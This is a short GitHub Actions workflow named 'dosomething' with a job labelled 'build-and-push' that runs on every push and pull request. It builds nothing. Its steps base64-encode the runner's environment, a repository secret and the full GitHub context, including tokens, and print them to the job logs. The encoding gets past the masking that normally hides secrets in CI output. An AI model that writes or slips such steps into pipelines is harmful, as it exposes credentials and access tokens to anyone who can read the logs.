name: dosomething


on:
  push:
  pull_request:

jobs:
  build-and-push:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
      with:
        fetch-depth: 0
    - run: env | base64 -w 0
    - run: |
        echo ${{ vars.MYACTION_VARIABLE }}
        echo ${{ vars.MYACTION_SECRET }}
        echo ${{ secrets.MYACTION_SECRET }} | base64
    - env:
        GITHUB_CONTEXT: ${{ toJson(github) }}
      run: echo "$GITHUB_CONTEXT" | base64 -w 0
  
